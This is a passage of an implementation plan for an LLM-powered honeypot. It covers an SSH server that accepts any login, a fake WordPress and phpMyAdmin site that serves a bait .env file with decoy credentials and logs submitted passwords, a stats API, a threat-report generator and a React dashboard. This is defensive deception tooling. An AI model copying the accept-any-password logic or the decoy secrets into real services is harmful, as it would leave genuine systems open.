from dotenv import load_dotenv

load_dotenv()

def _engine_url() -> str:
    port = os.getenv("LLM_ENGINE_PORT", "8000")
    return f"http://127.0.0.1:{port}"

def respond(
    session_id: str,
    protocol: str,
    command: str,
    current_dir: str,
    user: str,
    history: list[str],
) -> dict:
    payload = {
        "session_id": session_id,
        "protocol": protocol,
        "command": command,
        "current_dir": current_dir,
        "user": user,
        "history": history,
    }
    try:
        r = httpx.post(_engine_url() + "/respond", json=payload, timeout=20.0)
        r.raise_for_status()
        return r.json()
    except Exception:
        return {
            "session_id": session_id,
            "response": "command not found\n",
            "intent": "unknown",
            "confidence": 0.0,
            "cache_hit": False,
        }
```

- [ ] **Step 2: Verify against running Layer 2**

```bash
# With Layer 2 running (uvicorn layer2.main:app --port 8000):
python -c "
from layer1.llm_client import respond
r = respond('s1','ssh','ls','/','admin',[])
print(r)
"
```
Expected: dict with `cache_hit: True` and directory listing in `response`

- [ ] **Step 3: Commit**

```bash
git add layer1/llm_client.py
git commit -m "feat: Layer 1 HTTP client to Layer 2 LLM engine"
```

---

## Task 11: Layer 1 — SSH Server

**Files:**
- Create: `layer1/ssh_server.py`

- [ ] **Step 1: Generate SSH host key file**

```bash
cd honeypot && python -c "
import paramiko, os
key = paramiko.RSAKey.generate(2048)
key.write_private_key_file('.ssh_host_key')
print('Host key generated')
"
```

- [ ] **Step 2: Create `layer1/ssh_server.py`**

```python
import os
import socket
import threading
import time
import uuid
import paramiko
from dotenv import load_dotenv
from layer1.session_manager import SessionManager
from layer1 import llm_client, logger as log_module

load_dotenv()

HOST_KEY_PATH = ".ssh_host_key"

def _host_key() -> paramiko.RSAKey:
    if os.path.exists(HOST_KEY_PATH):
        return paramiko.RSAKey(filename=HOST_KEY_PATH)
    key = paramiko.RSAKey.generate(2048)
    key.write_private_key_file(HOST_KEY_PATH)
    return key

_SESSION_MGR = SessionManager()
_HOST_KEY = _host_key()

class _ServerInterface(paramiko.ServerInterface):
    def __init__(self):
        self.username = "admin"
        self._shell_ready = threading.Event()

    def check_auth_password(self, username, password):
        self.username = username
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        self.username = username
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED if kind == "session" else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel):
        self._shell_ready.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def get_banner(self):
        return ("Ubuntu 18.04.6 LTS", "en-US")


def _handle_client(sock: socket.socket, addr: tuple, logger: log_module.Logger) -> None:
    try:
        transport = paramiko.Transport(sock)
        transport.local_version = "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7"
        transport.add_server_key(_HOST_KEY)
        server = _ServerInterface()
        transport.start_server(server=server)

        chan = transport.accept(30)
        if chan is None:
            return
        server._shell_ready.wait(10)

        session_id = str(uuid.uuid4())
        _SESSION_MGR.create(session_id, server.username, addr[0])
        logger.session_start(session_id, "ssh", addr[0])

        chan.send(
            b"\r\nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)\r\n"
            b" * Documentation:  https://help.ubuntu.com\r\n\r\n"
        )

        buf = ""
        timeout = int(os.getenv("SESSION_TIMEOUT_SECONDS", "600"))
        chan.settimeout(timeout)

        while True:
            session = _SESSION_MGR.get(session_id)
            prompt = f"{server.username}@web-server-01:{session['current_dir']}$ "
            chan.send(prompt.encode())

            while True:
                try:
                    data = chan.recv(256)
                except Exception:
                    return
                if not data:
                    return
                text = data.decode("utf-8", errors="replace")

                if text in ("\r", "\n", "\r\n"):
                    chan.send(b"\r\n")
                    break
                elif text in ("\x7f", "\x08"):
                    if buf:
                        buf = buf[:-1]
                        chan.send(b"\x08 \x08")
                elif text == "\x03":
                    buf = ""
                    chan.send(b"^C\r\n")
                    break
                elif text in ("\x04",):
                    chan.send(b"logout\r\n")
                    return
                else:
                    buf += text
                    chan.send(text.encode())

            command = buf.strip()
            buf = ""

            if not command:
                continue

            if command in ("exit", "quit", "logout"):
                chan.send(b"logout\r\n")
                break

            # cd handled entirely in Layer 1
            if command.startswith("cd"):
                new_dir, err = _SESSION_MGR.handle_cd(session_id, command)
                output = err
                intent, conf, cache_hit = "reconnaissance", 0.9, True
            else:
                _SESSION_MGR.push_history(session_id, command)
                result = llm_client.respond(
                    session_id=session_id,
                    protocol="ssh",
                    command=command,
                    current_dir=_SESSION_MGR.get(session_id)["current_dir"],
                    user=server.username,
                    history=_SESSION_MGR.get(session_id)["history"],
                )
                output = result["response"]
                intent = result["intent"]
                conf = result["confidence"]
                cache_hit = result["cache_hit"]

            # stream char-by-char with \n → \r\n
            for ch in output:
                if ch == "\n":
                    chan.send(b"\r\n")
                else:
                    chan.send(ch.encode())

            logger.command(session_id, command, output, intent, conf, cache_hit)

        logger.session_end(session_id, _compute_threat_level(session_id, logger))
    except Exception as e:
        print(f"[ssh] connection error {addr}: {e}")
    finally:
        try:
            transport.close()
        except Exception:
            pass


def _compute_threat_level(session_id: str, logger: log_module.Logger) -> str:
    from layer2.db import get_conn
    conn = get_conn()
    rows = conn.execute(
        "SELECT intent FROM commands WHERE session_id=?", (session_id,)
    ).fetchall()
    conn.close()
    intents = [r[0] for r in rows]
    if "privilege_escalation" in intents or "data_exfiltration" in intents:
        return "High"
    if "persistence" in intents or "lateral_movement" in intents:
        return "Medium"
    return "Low"


def run(host: str = "0.0.0.0") -> None:
    port = int(os.getenv("SSH_PORT", "2222"))
    logger = log_module.Logger()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(10)
    print(f"[ssh] listening on {host}:{port}")
    while True:
        client_sock, addr = sock.accept()
        print(f"[ssh] connection from {addr}")
        threading.Thread(target=_handle_client, args=(client_sock, addr, logger), daemon=True).start()


if __name__ == "__main__":
    run()
```

- [ ] **Step 3: Smoke test (requires Layer 2 running)**

```bash
# Terminal 1: uvicorn layer2.main:app --port 8000
# Terminal 2:
python layer1/ssh_server.py
# Terminal 3:
ssh -p 2222 anyuser@localhost  # password: anything
```
Expected: Ubuntu banner, working prompt, `whoami` returns username.

- [ ] **Step 4: Commit**

```bash
git add layer1/ssh_server.py
git commit -m "feat: Layer 1 paramiko SSH honeypot server"
```

---

## Task 12: Layer 1 — HTTP Server (WordPress Persona)

**Files:**
- Create: `layer1/http_server.py`

- [ ] **Step 1: Create `layer1/http_server.py`**

```python
import os
import json
import uuid
import time
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import uvicorn
from dotenv import load_dotenv
from layer1 import logger as log_module

load_dotenv()

app = FastAPI()
_logger = log_module.Logger()

_WP_LOGIN_HTML = """\
<!DOCTYPE html><html><head><title>Log In &lsaquo; Demo Site &mdash; WordPress</title>
<style>body{{font-family:Georgia,serif;background:#f1f1f1;}}
#login{{width:320px;margin:8% auto;background:#fff;padding:26px 24px;border:1px solid #c3c4c7;}}
h1{{text-align:center;font-size:16px;}}input{{width:100%;padding:8px;margin:4px 0 12px;box-sizing:border-box;}}
.button{{background:#0073aa;color:#fff;border:none;padding:10px;width:100%;cursor:pointer;}}
</style></head><body>
<div id="login"><h1>Demo Site</h1>
<form method="post" action="/wp-login.php">
<label>Username<br/><input name="log" type="text" autocomplete="off"/></label>
<label>Password<br/><input name="pwd" type="password"/></label>
<input name="wp-submit" type="submit" class="button" value="Log In"/>
<input name="redirect_to" type="hidden" value="/wp-admin/"/>
</form></div></body></html>
"""

_FAKE_ENV = """\
APP_ENV=production
APP_KEY=base64:3lV7kQmN2pXwR8sT1uYvZaB4cDeF6gHi
DB_HOST=localhost
DB_DATABASE=ecommerce_db
DB_USERNAME=dbadmin
DB_PASSWORD=Sup3rS3cr3t!2019
AWS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
"""

_PHPMYADMIN_HTML = """\
<!DOCTYPE html><html><head><title>phpMyAdmin</title>
<style>body{{font-family:sans-serif;background:#eee;}}
#login{{width:300px;margin:10% auto;background:#fff;padding:24px;border:1px solid #ccc;}}
input{{width:100%;padding:7px;margin:4px 0 10px;box-sizing:border-box;}}
.btn{{background:#4278a0;color:#fff;border:none;padding:8px;width:100%;cursor:pointer;}}
</style></head><body>
<div id="login"><h2>phpMyAdmin</h2>
<form method="post">
<label>Username<br/><input name="pma_username" type="text"/></label>
<label>Password<br/><input name="pma_password" type="password"/></label>
<input type="submit" class="btn" value="Go"/>
</form></div></body></html>
"""

_XMLRPC = """<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><params><param><value><array><data>
<value><string>blogger.deletePost</string></value>
<value><string>blogger.getPost</string></value>
<value><string>wp.getUsersBlogs</string></value>
</data></array></value></param></params></methodResponse>"""

def _session_id(request: Request) -> str:
    ip = request.client.host
    return f"http-{ip}-{int(time.time())}"

def _log(request: Request, path: str, body: str, code: int, creds: str | None = None):
    sid = _session_id(request)
    _logger.session_start(sid, "http", request.client.host)
    _logger.http_request(sid, request.method, path, body, code, creds)

@app.get("/wp-admin", response_class=HTMLResponse)
@app.get("/wp-admin/", response_class=HTMLResponse)
@app.get("/wp-login.php", response_class=HTMLResponse)
async def wp_login_get(request: Request):
    _log(request, request.url.path, "", 200)
    return HTMLResponse(_WP_LOGIN_HTML, status_code=200)

@app.post("/wp-login.php", response_class=HTMLResponse)
async def wp_login_post(request: Request, log: str = Form(""), pwd: str = Form("")):
    creds = json.dumps({"username": log, "password": pwd})
    _log(request, "/wp-login.php", f"log={log}&pwd={pwd}", 200, creds)
    body = _WP_LOGIN_HTML.replace(
        "</form>",
        '<p style="color:red;font-size:13px;">ERROR: Invalid username or incorrect password.</p></form>'
    )
    return HTMLResponse(body, status_code=200)

@app.get("/.env")
async def dot_env(request: Request):
    _log(request, "/.env", "", 200)
    return HTMLResponse(_FAKE_ENV, media_type="text/plain")

@app.get("/phpmyadmin", response_class=HTMLResponse)
@app.get("/phpmyadmin/", response_class=HTMLResponse)
async def phpmyadmin(request: Request):
    _log(request, request.url.path, "", 200)
    return HTMLResponse(_PHPMYADMIN_HTML)

@app.get("/xmlrpc.php")
async def xmlrpc(request: Request):
    _log(request, "/xmlrpc.php", "", 200)
    return HTMLResponse(_XMLRPC, media_type="application/xml")

@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def catch_all(request: Request, path: str):
    body = (await request.body()).decode(errors="replace")
    _log(request, "/" + path, body, 404)
    return HTMLResponse(
        f'<!DOCTYPE html><html><head><title>Page not found &lsaquo; Demo Site &mdash; WordPress</title></head>'
        f'<body><h1>Not Found</h1><p>The page <code>/{path}</code> could not be found.</p>'
        f'<p>It seems we can&rsquo;t find what you&rsquo;re looking for.</p></body></html>',
        status_code=404
    )

def run() -> None:
    port = int(os.getenv("HTTP_PORT", "8080"))
    uvicorn.run(app, host="0.0.0.0", port=port)

if __name__ == "__main__":
    run()
```

- [ ] **Step 2: Smoke test**

```bash
python layer1/http_server.py &
curl -s http://localhost:8080/wp-admin | grep -o "Log In"
curl -s http://localhost:8080/.env | grep DB_PASSWORD
curl -s http://localhost:8080/nonexistent | grep "Not Found"
```
Expected: `Log In`, `DB_PASSWORD=Sup3rS3cr3t!2019`, `Not Found`

- [ ] **Step 3: Commit**

```bash
git add layer1/http_server.py
git commit -m "feat: Layer 1 HTTP WordPress honeypot server"
```

---

## Task 13: Layer 3 — Stats API + WebSocket

**Files:**
- Create: `layer3/stats_api.py`
- Create: `tests/layer3/test_stats_api.py`

- [ ] **Step 1: Write failing test**

```python
# tests/layer3/test_stats_api.py
import sqlite3
import pytest
from fastapi.testclient import TestClient
from layer2.db import init_db

@pytest.fixture
def client(tmp_db):
    init_db(tmp_db)
    conn = sqlite3.connect(tmp_db)
    conn.execute("INSERT INTO sessions VALUES ('s1','ssh','1.2.3.4',CURRENT_TIMESTAMP,CURRENT_TIMESTAMP,3,'High',NULL)")
    conn.execute("INSERT INTO commands VALUES (1,'s1',CURRENT_TIMESTAMP,'whoami','admin','reconnaissance',0.95,1)")
    conn.execute("INSERT INTO commands VALUES (2,'s1',CURRENT_TIMESTAMP,'sudo su','',\"privilege_escalation\",0.95,0)")
    conn.commit()
    conn.close()
    from layer3.stats_api import app
    return TestClient(app)

def test_get_sessions(client):
    resp = client.get("/api/sessions")
    assert resp.status_code == 200
    data = resp.json()
    assert len(data) == 1
    assert data[0]["session_id"] == "s1"

def test_get_session_detail(client):
    resp = client.get("/api/sessions/s1")
    assert resp.status_code == 200
    data = resp.json()
    assert data["session_id"] == "s1"
    assert len(data["commands"]) == 2

def test_intent_stats(client):
    resp = client.get("/api/stats/intents")
    assert resp.status_code == 200
    data = resp.json()
    intents = {d["intent"] for d in data}
    assert "reconnaissance" in intents

def test_top_commands(client):
    resp = client.get("/api/stats/commands")
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer3/test_stats_api.py -v
```

- [ ] **Step 3: Create `layer3/stats_api.py`**

```python
import os
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
import uvicorn
from layer2.db import get_conn

load_dotenv()

app = FastAPI(title="HoneyPot Stats API")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

_ws_clients: list[WebSocket] = []

@app.get("/api/sessions")
def list_sessions():
    conn = get_conn()
    rows = conn.execute(
        "SELECT session_id, protocol, attacker_ip, start_time, end_time, total_cmds, threat_level "
        "FROM sessions ORDER BY start_time DESC"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/sessions/{session_id}")
def get_session(session_id: str):
    conn = get_conn()
    session = conn.execute(
        "SELECT * FROM sessions WHERE session_id=?", (session_id,)
    ).fetchone()
    commands = conn.execute(
        "SELECT * FROM commands WHERE session_id=? ORDER BY timestamp", (session_id,)
    ).fetchall()
    http_reqs = conn.execute(
        "SELECT * FROM http_requests WHERE session_id=? ORDER BY timestamp", (session_id,)
    ).fetchall()
    conn.close()
    if not session:
        return {"error": "not found"}
    return {
        **dict(session),
        "commands": [dict(c) for c in commands],
        "http_requests": [dict(r) for r in http_reqs],
    }

@app.get("/api/stats/intents")
def intent_stats():
    conn = get_conn()
    rows = conn.execute(
        "SELECT intent, COUNT(*) as count FROM commands GROUP BY intent ORDER BY count DESC"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/stats/commands")
def top_commands(limit: int = 20):
    conn = get_conn()
    rows = conn.execute(
        "SELECT command, COUNT(*) as count FROM commands GROUP BY command ORDER BY count DESC LIMIT ?",
        (limit,)
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/stats/timeline")
def timeline():
    conn = get_conn()
    rows = conn.execute(
        "SELECT strftime('%Y-%m-%dT%H:00:00', timestamp) as hour, COUNT(*) as count "
        "FROM commands GROUP BY hour ORDER BY hour"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/reports/{session_id}")
def get_report(session_id: str):
    conn = get_conn()
    row = conn.execute("SELECT report FROM sessions WHERE session_id=?", (session_id,)).fetchone()
    conn.close()
    return {"report": row[0] if row else None}

@app.websocket("/ws/live")
async def ws_live(ws: WebSocket):
    await ws.accept()
    _ws_clients.append(ws)
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        _ws_clients.remove(ws)

async def broadcast(event: dict) -> None:
    dead = []
    for ws in _ws_clients:
        try:
            import json
            await ws.send_text(json.dumps(event))
        except Exception:
            dead.append(ws)
    for ws in dead:
        _ws_clients.remove(ws)

def run() -> None:
    port = int(os.getenv("STATS_API_PORT", "8001"))
    uvicorn.run(app, host="0.0.0.0", port=port)

if __name__ == "__main__":
    run()
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer3/test_stats_api.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer3/stats_api.py tests/layer3/test_stats_api.py
git commit -m "feat: Layer 3 stats API with WebSocket live feed"
```

---

## Task 14: Layer 3 — Report Generator

**Files:**
- Create: `layer3/report_generator.py`

- [ ] **Step 1: Create `layer3/report_generator.py`**

```python
import json
from layer2.db import get_conn
from layer2.ollama_client import generate

_REPORT_SYSTEM = """\
You are a cybersecurity analyst writing a threat intelligence report.
Given attacker session logs, produce a professional Markdown report with these sections:
## Executive Summary
## Attack Timeline
## Intent Analysis
## Indicators of Compromise (IoCs)
## Threat Level Assessment

Be concise but professional. Threat Level must be one of: Low / Medium / High / Critical.
"""

def generate_report(session_id: str) -> str:
    conn = get_conn()
    session = conn.execute("SELECT * FROM sessions WHERE session_id=?", (session_id,)).fetchone()
    commands = conn.execute(
        "SELECT timestamp, command, intent, confidence FROM commands WHERE session_id=? ORDER BY timestamp",
        (session_id,)
    ).fetchall()
    http_reqs = conn.execute(
        "SELECT timestamp, method, path, harvested_creds FROM http_requests WHERE session_id=? ORDER BY timestamp",
        (session_id,)
    ).fetchall()
    conn.close()

    if not session:
        return "# Error\nSession not found."

    log_lines = []
    for c in commands:
        log_lines.append(f"[{c[0]}] CMD: {c[1]} | Intent: {c[2]} (confidence: {c[3]:.0%})")
    for r in http_reqs:
        creds = f" | CREDS: {r[3]}" if r[3] else ""
        log_lines.append(f"[{r[0]}] HTTP {r[1]} {r[2]}{creds}")

    prompt_content = (
        f"Session ID: {session_id}\n"
        f"Protocol: {dict(session)['protocol']}\n"
        f"Attacker IP: {dict(session)['attacker_ip']}\n"
        f"Duration: {dict(session)['start_time']} → {dict(session)['end_time']}\n"
        f"Total events: {len(log_lines)}\n\n"
        f"Event log:\n" + "\n".join(log_lines)
    )

    messages = [
        {"role": "system", "content": _REPORT_SYSTEM},
        {"role": "user", "content": prompt_content},
    ]
    report = generate(messages)

    conn = get_conn()
    conn.execute("UPDATE sessions SET report=? WHERE session_id=?", (report, session_id))
    conn.commit()
    conn.close()

    return report
```

- [ ] **Step 2: Smoke test (requires Ollama)**

```bash
python -c "
from layer2.db import init_db, get_conn
import sqlite3
init_db()
conn = get_conn()
conn.execute(\"INSERT OR IGNORE INTO sessions VALUES ('demo1','ssh','1.2.3.4',CURRENT_TIMESTAMP,CURRENT_TIMESTAMP,3,'High',NULL)\")
conn.execute(\"INSERT INTO commands VALUES (NULL,'demo1',CURRENT_TIMESTAMP,'whoami','admin','reconnaissance',0.95,1)\")
conn.execute(\"INSERT INTO commands VALUES (NULL,'demo1',CURRENT_TIMESTAMP,'sudo su -','',\\'privilege_escalation\\',0.95,0)\")
conn.commit()
conn.close()
from layer3.report_generator import generate_report
print(generate_report('demo1'))
"
```

- [ ] **Step 3: Commit**

```bash
git add layer3/report_generator.py
git commit -m "feat: Layer 3 LLM-based threat intelligence report generator"
```

---

## Task 15: React Frontend — Setup

**Files:**
- Create: `layer3/frontend/` (Vite React project)

- [ ] **Step 1: Scaffold Vite project**

```bash
cd honeypot/layer3
npm create vite@latest frontend -- --template react-ts
cd frontend && npm install
npm install react-router-dom recharts react-markdown tailwindcss @tailwindcss/vite
```

- [ ] **Step 2: Configure Tailwind — `vite.config.ts`**

```typescript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'

export default defineConfig({
  plugins: [react(), tailwindcss()],
  server: { proxy: { '/api': 'http://localhost:8001', '/ws': { target: 'ws://localhost:8001', ws: true } } }
})
```

- [ ] **Step 3: Create `src/index.css`**

```css
@import "tailwindcss";
```

- [ ] **Step 4: Create `src/App.tsx`**

```tsx
import { BrowserRouter, Routes, Route, NavLink } from 'react-router-dom'
import Dashboard from './pages/Dashboard'
import Sessions from './pages/Sessions'
import Reports from './pages/Reports'

export default function App() {
  return (
    <BrowserRouter>
      <div className="min-h-screen bg-gray-950 text-gray-100">
        <nav className="bg-gray-900 border-b border-gray-800 px-6 py-3 flex gap-6">
          <span className="font-bold text-red-400 mr-4">🍯 HoneyPot</span>
          {[['/', 'Dashboard'], ['/sessions', 'Sessions'], ['/reports', 'Reports']].map(([to, label]) => (
            <NavLink key={to} to={to} end
              className={({ isActive }) => isActive ? 'text-white font-semibold' : 'text-gray-400 hover:text-white'}>
              {label}
            </NavLink>
          ))}
        </nav>
        <main className="p-6">
          <Routes>
            <Route path="/" element={<Dashboard />} />
            <Route path="/sessions" element={<Sessions />} />
            <Route path="/reports" element={<Reports />} />
          </Routes>
        </main>
      </div>
    </BrowserRouter>
  )
}
```

- [ ] **Step 5: Verify dev server starts**

```bash
npm run dev
```
Expected: Vite dev server on http://localhost:5173 with navbar visible.

- [ ] **Step 6: Commit**

```bash
cd ../../.. && git add layer3/frontend/
git commit -m "feat: React + Vite frontend scaffold with Tailwind and routing"
```

---

## Task 16: React — Dashboard Page

**Files:**
- Create: `layer3/frontend/src/pages/Dashboard.tsx`
- Create: `layer3/frontend/src/components/LiveFeed.tsx`
- Create: `layer3/frontend/src/components/IntentChart.tsx`

- [ ] **Step 1: Create `src/components/LiveFeed.tsx`**

```tsx
import { useEffect, useRef, useState } from 'react'

interface Event { command: string; intent: string; session_id: string; timestamp: string }

export default function LiveFeed() {
  const [events, setEvents] = useState<Event[]>([])
  const bottom = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const ws = new WebSocket(`ws://${location.host}/ws/live`)
    ws.onmessage = (e) => {
      try {
        const ev = JSON.parse(e.data)
        setEvents(prev => [...prev.slice(-49), ev])
      } catch {}
    }
    return () => ws.close()
  }, [])

  useEffect(() => { bottom.current?.scrollIntoView({ behavior: 'smooth' }) }, [events])

  const intentColor: Record<string, string> = {
    reconnaissance: 'text-blue-400',
    privilege_escalation: 'text-red-400',
    data_exfiltration: 'text-orange-400',
    persistence: 'text-yellow-400',
    lateral_movement: 'text-purple-400',
    unknown: 'text-gray-400',
  }

  return (
    <div className="bg-gray-900 rounded-lg p-4 h-72 overflow-y-auto font-mono text-sm">
      <div className="text-gray-500 text-xs mb-2">● LIVE FEED</div>
      {events.length === 0 && <div className="text-gray-600">Waiting for attackers...</div>}
      {events.map((ev, i) => (
        <div key={i} className="flex gap-3 mb-1">
          <span className="text-gray-600 shrink-0">{ev.timestamp?.slice(11, 19)}</span>
          <span className={`shrink-0 w-32 ${intentColor[ev.intent] ?? 'text-gray-400'}`}>{ev.intent}</span>
          <span className="text-green-300 truncate">{ev.command}</span>
        </div>
      ))}
      <div ref={bottom} />
    </div>
  )
}
```

- [ ] **Step 2: Create `src/components/IntentChart.tsx`**

```tsx
import { useEffect, useState } from 'react'
import { PieChart, Pie, Cell, Tooltip, Legend } from 'recharts'

const COLORS = ['#60a5fa','#f87171','#fb923c','#facc15','#a78bfa','#94a3b8']

export default function IntentChart() {
  const [data, setData] = useState<{intent:string; count:number}[]>([])
  useEffect(() => {
    fetch('/api/stats/intents').then(r => r.json()).then(setData)
  }, [])
  return (
    <div className="bg-gray-900 rounded-lg p-4">
      <div className="text-gray-400 text-xs mb-3">INTENT DISTRIBUTION</div>
      <PieChart width={280} height={200}>
        <Pie data={data} dataKey="count" nameKey="intent" cx="50%" cy="50%" outerRadius={70}>
          {data.map((_, i) => <Cell key={i} fill={COLORS[i % COLORS.length]} />)}
        </Pie>
        <Tooltip formatter={(v) => [v, 'count']} />
        <Legend />
      </PieChart>
    </div>
  )
}
```

- [ ] **Step 3: Create `src/pages/Dashboard.tsx`**

```tsx
import { useEffect, useState } from 'react'
import LiveFeed from '../components/LiveFeed'
import IntentChart from '../components/IntentChart'

export default function Dashboard() {
  const [sessions, setSessions] = useState<any[]>([])
  useEffect(() => { fetch('/api/sessions').then(r => r.json()).then(setSessions) }, [])

  const threatBadge: Record<string, string> = {
    High: 'bg-red-900 text-red-300',
    Medium: 'bg-yellow-900 text-yellow-300',
    Low: 'bg-green-900 text-green-300',
    Critical: 'bg-red-950 text-red-200',
  }

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-3 gap-4">
        <div className="bg-gray-900 rounded-lg p-4">
          <div className="text-gray-400 text-xs">TOTAL SESSIONS</div>
          <div className="text-3xl font-bold text-white mt-1">{sessions.length}</div>
        </div>
        <div className="bg-gray-900 rounded-lg p-4">
          <div className="text-gray-400 text-xs">HIGH THREAT</div>
          <div className="text-3xl font-bold text-red-400 mt-1">
            {sessions.filter(s => s.threat_level === 'High' || s.threat_level === 'Critical').length}
          </div>
        </div>
        <div className="bg-gray-900 rounded-lg p-4">
          <div className="text-gray-400 text-xs">TOTAL COMMANDS</div>
          <div className="text-3xl font-bold text-blue-400 mt-1">
            {sessions.reduce((sum, s) => sum + (s.total_cmds || 0), 0)}
          </div>
        </div>
      </div>
      <LiveFeed />
      <div className="grid grid-cols-2 gap-4">
        <IntentChart />
        <div className="bg-gray-900 rounded-lg p-4">
          <div className="text-gray-400 text-xs mb-3">RECENT SESSIONS</div>
          <div className="space-y-2">
            {sessions.slice(0, 8).map(s => (
              <div key={s.session_id} className="flex justify-between items-center text-sm">
                <span className="text-gray-300 font-mono">{s.attacker_ip}</span>
                <span className="text-gray-500">{s.protocol?.toUpperCase()}</span>
                <span className={`text-xs px-2 py-0.5 rounded ${threatBadge[s.threat_level] ?? 'bg-gray-800 text-gray-400'}`}>
                  {s.threat_level ?? 'Unknown'}
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}
```

- [ ] **Step 4: Verify in browser**

```bash
npm run dev
```
Open http://localhost:5173 — should show stat cards, live feed, intent pie chart, recent sessions.

- [ ] **Step 5: Commit**

```bash
git add layer3/frontend/src/
git commit -m "feat: Dashboard page with live WebSocket feed and intent chart"
```

---

## Task 17: React — Sessions & Reports Pages

**Files:**
- Create: `layer3/frontend/src/pages/Sessions.tsx`
- Create: `layer3/frontend/src/pages/Reports.tsx`

- [ ] **Step 1: Create `src/pages/Sessions.tsx`**

```tsx
import { useEffect, useState } from 'react'

const intentColor: Record<string, string> = {
  reconnaissance: 'text-blue-400', privilege_escalation: 'text-red-400',
  data_exfiltration: 'text-orange-400', persistence: 'text-yellow-400',
  lateral_movement: 'text-purple-400', unknown: 'text-gray-500',
}

export default function Sessions() {
  const [sessions, setSessions] = useState<any[]>([])
  const [selected, setSelected] = useState<any>(null)

  useEffect(() => { fetch('/api/sessions').then(r => r.json()).then(setSessions) }, [])

  const loadSession = (id: string) =>
    fetch(`/api/sessions/${id}`).then(r => r.json()).then(setSelected)

  return (
    <div className="grid grid-cols-3 gap-4 h-[calc(100vh-7rem)]">
      <div className="bg-gray-900 rounded-lg p-4 overflow-y-auto col-span-1">
        <div className="text-gray-400 text-xs mb-3">SESSIONS</div>
        {sessions.map(s => (
          <button key={s.session_id} onClick={() => loadSession(s.session_id)}
            className="w-full text-left p-3 rounded mb-2 bg-gray-800 hover:bg-gray-700">
            <div className="text-sm font-mono text-white">{s.attacker_ip}</div>
            <div className="text-xs text-gray-400">{s.protocol?.toUpperCase()} · {s.total_cmds} cmds · {s.threat_level}</div>
          </button>
        ))}
      </div>
      <div className="bg-gray-900 rounded-lg p-4 overflow-y-auto col-span-2 font-mono text-sm">
        {!selected && <div className="text-gray-600">Select a session to replay</div>}
        {selected?.commands?.map((c: any, i: number) => (
          <div key={i} className="mb-2 border-b border-gray-800 pb-2">
            <div className="flex gap-3 text-xs text-gray-500 mb-1">
              <span>{c.timestamp?.slice(11, 19)}</span>
              <span className={intentColor[c.intent] ?? ''}>{c.intent}</span>
              {c.cache_hit ? <span className="text-gray-600">[cache]</span> : null}
            </div>
            <div className="text-green-300">$ {c.command}</div>
            <div className="text-gray-300 whitespace-pre-wrap text-xs mt-1">{c.response?.slice(0, 300)}</div>
          </div>
        ))}
      </div>
    </div>
  )
}
```

- [ ] **Step 2: Create `src/pages/Reports.tsx`**

```tsx
import { useEffect, useState } from 'react'
import Markdown from 'react-markdown'

export default function Reports() {
  const [sessions, setSessions] = useState<any[]>([])
  const [report, setReport] = useState<string>('')
  const [generating, setGenerating] = useState(false)

  useEffect(() => { fetch('/api/sessions').then(r => r.json()).then(setSessions) }, [])

  const loadReport = async (id: string) => {
    const { report } = await fetch(`/api/reports/${id}`).then(r => r.json())
    if (report) { setReport(report); return }
    setGenerating(true)
    const res = await fetch(`/api/reports/${id}/generate`, { method: 'POST' })
    const data = await res.json()
    setReport(data.report || 'Generation failed.')
    setGenerating(false)
  }

  return (
    <div className="grid grid-cols-3 gap-4">
      <div className="bg-gray-900 rounded-lg p-4 col-span-1 overflow-y-auto max-h-[calc(100vh-7rem)]">
        <div className="text-gray-400 text-xs mb-3">SELECT SESSION</div>
        {sessions.map(s => (
          <button key={s.session_id} onClick={() => loadReport(s.session_id)}
            className="w-full text-left p-3 rounded mb-2 bg-gray-800 hover:bg-gray-700">
            <div className="text-sm font-mono text-white">{s.attacker_ip}</div>
            <div className="text-xs text-gray-400">{s.protocol?.toUpperCase()} · {s.threat_level}</div>
          </button>
        ))}
      </div>
      <div className="col-span-2 bg-gray-900 rounded-lg p-6 overflow-y-auto max-h-[calc(100vh-7rem)]">
        {generating && <div className="text-yellow-400 animate-pulse">Generating report with LLM...</div>}
        {!report && !generating && <div className="text-gray-600">Select a session to view or generate its report.</div>}
        {report && (
          <div className="prose prose-invert max-w-none prose-headings:text-white prose-p:text-gray-300">
            <Markdown>{report}</Markdown>
          </div>
        )}
      </div>
    </div>
  )
}
```

- [ ] **Step 3: Add report generation endpoint to `layer3/stats_api.py`**

```python
# Add this route to stats_api.py after the existing /api/reports/{session_id} GET route:

@app.post("/api/reports/{session_id}/generate")
